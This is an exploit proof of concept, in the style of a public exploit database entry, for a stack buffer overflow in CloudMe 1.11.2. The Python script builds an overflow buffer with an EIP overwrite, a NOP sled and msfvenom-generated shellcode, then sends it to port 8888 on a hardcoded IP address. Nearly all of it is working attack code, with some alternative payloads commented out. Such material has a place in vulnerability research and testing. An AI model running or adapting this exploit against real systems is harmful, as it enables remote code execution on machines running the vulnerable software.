# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "10.10.14.49"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
#payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
#payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
#payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
#payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
#payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
#payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
#payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
#payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
#payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
#payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
#payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
#payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
#payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
#payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
#payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
#payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
#payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"
#payload =  b""
#payload += b"\xb8\x83\x1f\x7b\x91\xda\xc6\xd9\x74\x24\xf4"
#payload += b"\x5e\x31\xc9\xb1\x52\x83\xc6\x04\x31\x46\x0e"
#payload += b"\x03\xc5\x11\x99\x64\x35\xc5\xdf\x87\xc5\x16"
#payload += b"\x80\x0e\x20\x27\x80\x75\x21\x18\x30\xfd\x67"
#payload += b"\x95\xbb\x53\x93\x2e\xc9\x7b\x94\x87\x64\x5a"
#payload += b"\x9b\x18\xd4\x9e\xba\x9a\x27\xf3\x1c\xa2\xe7"
#payload += b"\x06\x5d\xe3\x1a\xea\x0f\xbc\x51\x59\xbf\xc9"
#payload += b"\x2c\x62\x34\x81\xa1\xe2\xa9\x52\xc3\xc3\x7c"
#payload += b"\xe8\x9a\xc3\x7f\x3d\x97\x4d\x67\x22\x92\x04"
#payload += b"\x1c\x90\x68\x97\xf4\xe8\x91\x34\x39\xc5\x63"
#payload += b"\x44\x7e\xe2\x9b\x33\x76\x10\x21\x44\x4d\x6a"
#payload += b"\xfd\xc1\x55\xcc\x76\x71\xb1\xec\x5b\xe4\x32"
#payload += b"\xe2\x10\x62\x1c\xe7\xa7\xa7\x17\x13\x23\x46"
#payload += b"\xf7\x95\x77\x6d\xd3\xfe\x2c\x0c\x42\x5b\x82"
#payload += b"\x31\x94\x04\x7b\x94\xdf\xa9\x68\xa5\x82\xa5"
#payload += b"\x5d\x84\x3c\x36\xca\x9f\x4f\x04\x55\x34\xc7"
#payload += b"\x24\x1e\x92\x10\x4a\x35\x62\x8e\xb5\xb6\x93"
#payload += b"\x87\x71\xe2\xc3\xbf\x50\x8b\x8f\x3f\x5c\x5e"
#payload += b"\x1f\x6f\xf2\x31\xe0\xdf\xb2\xe1\x88\x35\x3d"
#payload += b"\xdd\xa9\x36\x97\x76\x43\xcd\x70\x73\x9e\xc3"
#payload += b"\xb1\xeb\x9c\xdb\xb0\x50\x29\x3d\xd8\xb6\x7c"
#payload += b"\x96\x75\x2e\x25\x6c\xe7\xaf\xf3\x09\x27\x3b"
#payload += b"\xf0\xee\xe6\xcc\x7d\xfc\x9f\x3c\xc8\x5e\x09"
#payload += b"\x42\xe6\xf6\xd5\xd1\x6d\x06\x93\xc9\x39\x51"
#payload += b"\xf4\x3c\x30\x37\xe8\x67\xea\x25\xf1\xfe\xd5"
#payload += b"\xed\x2e\xc3\xd8\xec\xa3\x7f\xff\xfe\x7d\x7f"
#payload += b"\xbb\xaa\xd1\xd6\x15\x04\x94\x80\xd7\xfe\x4e"
#payload += b"\x7e\xbe\x96\x17\x4c\x01\xe0\x17\x99\xf7\x0c"
#payload += b"\xa9\x74\x4e\x33\x06\x11\x46\x4c\x7a\x81\xa9"
#payload += b"\x87\x3e\xb1\xe3\x85\x17\x5a\xaa\x5c\x2a\x07"
#payload += b"\x4d\x8b\x69\x3e\xce\x39\x12\xc5\xce\x48\x17"
#payload += b"\x81\x48\xa1\x65\x9a\x3c\xc5\xda\x9b\x14"

payload =  b""
payload += b"\xda\xcb\xd9\x74\x24\xf4\xbf\xb8\x8d\xb9\x34"
payload += b"\x5b\x33\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17"
payload += b"\x83\x7b\x89\x5b\xc1\x87\x7a\x19\x2a\x77\x7b"
payload += b"\x7e\xa2\x92\x4a\xbe\xd0\xd7\xfd\x0e\x92\xb5"
payload += b"\xf1\xe5\xf6\x2d\x81\x88\xde\x42\x22\x26\x39"
payload += b"\x6d\xb3\x1b\x79\xec\x37\x66\xae\xce\x06\xa9"
payload += b"\xa3\x0f\x4e\xd4\x4e\x5d\x07\x92\xfd\x71\x2c"
payload += b"\xee\x3d\xfa\x7e\xfe\x45\x1f\x36\x01\x67\x8e"
payload += b"\x4c\x58\xa7\x31\x80\xd0\xee\x29\xc5\xdd\xb9"
payload += b"\xc2\x3d\xa9\x3b\x02\x0c\x52\x97\x6b\xa0\xa1"
payload += b"\xe9\xac\x07\x5a\x9c\xc4\x7b\xe7\xa7\x13\x01"
payload += b"\x33\x2d\x87\xa1\xb0\x95\x63\x53\x14\x43\xe0"
payload += b"\x5f\xd1\x07\xae\x43\xe4\xc4\xc5\x78\x6d\xeb"
payload += b"\x09\x09\x35\xc8\x8d\x51\xed\x71\x94\x3f\x40"
payload += b"\x8d\xc6\x9f\x3d\x2b\x8d\x32\x29\x46\xcc\x5a"
payload += b"\x9e\x6b\xee\x9a\x88\xfc\x9d\xa8\x17\x57\x09"
payload += b"\x81\xd0\x71\xce\xe6\xca\xc6\x40\x19\xf5\x36"
payload += b"\x49\xde\xa1\x66\xe1\xf7\xc9\xec\xf1\xf8\x1f"
payload += b"\xa2\xa1\x56\xf0\x03\x11\x17\xa0\xeb\x7b\x98"
payload += b"\x9f\x0c\x84\x72\x88\xa7\x7f\x15\xbd\x3d\x71"
payload += b"\xd4\xa9\x43\x8d\x17\x91\xcd\x6b\x7d\xf5\x9b"
payload += b"\x24\xea\x6c\x86\xbe\x8b\x71\x1c\xbb\x8c\xfa"
payload += b"\x93\x3c\x42\x0b\xd9\x2e\x33\xfb\x94\x0c\x92"
payload += b"\x04\x03\x38\x78\x96\xc8\xb8\xf7\x8b\x46\xef"
payload += b"\x50\x7d\x9f\x65\x4d\x24\x09\x9b\x8c\xb0\x72"
payload += b"\x1f\x4b\x01\x7c\x9e\x1e\x3d\x5a\xb0\xe6\xbe"
payload += b"\xe6\xe4\xb6\xe8\xb0\x52\x71\x43\x73\x0c\x2b"
payload += b"\x38\xdd\xd8\xaa\x72\xde\x9e\xb2\x5e\xa8\x7e"
payload += b"\x02\x37\xed\x81\xab\xdf\xf9\xfa\xd1\x7f\x05"
payload += b"\xd1\x51\x8f\x4c\x7b\xf3\x18\x09\xee\x41\x45"
payload += b"\xaa\xc5\x86\x70\x29\xef\x76\x87\x31\x9a\x73"
payload += b"\xc3\xf5\x77\x0e\x5c\x90\x77\xbd\x5d\xb1"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
